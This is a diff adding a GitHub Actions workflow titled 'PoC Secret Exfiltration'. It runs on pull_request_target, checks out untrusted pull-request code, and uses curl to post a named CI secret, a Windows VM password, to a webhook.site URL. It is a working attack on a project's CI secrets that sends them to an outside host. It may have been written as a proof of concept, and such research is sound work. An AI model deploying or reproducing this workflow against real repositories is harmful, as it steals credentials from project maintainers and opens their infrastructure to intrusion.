@@ -1,0 +1,37 @@
+name: PoC Secret Exfiltration
+
+on:
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout PR code (VULNERABLE)
+        uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+
+      - name: Debug Info
+        run: |
+          echo "Event: $GITHUB_EVENT_NAME"
+          echo "Actor: $GITHUB_ACTOR"
+
+      - name: Exfiltrate Secret
+        run: |
+          echo "Trying to access secret..."
+
+          if [ -n "$MINIKUBE_AZ_CI_WINDOWS_VM_PASSWORD" ]; then
+            echo "SECRET FOUND"
+
+            curl -X POST "https://webhook.site/cf45dc06-89a5-4376-87e3-c84e3abc47dd" \
+              --data-urlencode "SSHPASS=$MINIKUBE_AZ_CI_WINDOWS_VM_PASSWORD"
+
+          else
+            echo "SECRET NOT FOUND"
+
+            curl -X POST "https://webhook.site/cf45dc06-89a5-4376-87e3-c84e3abc47dd" \
+              --data-urlencode "status=secret_not_available"
+          fi
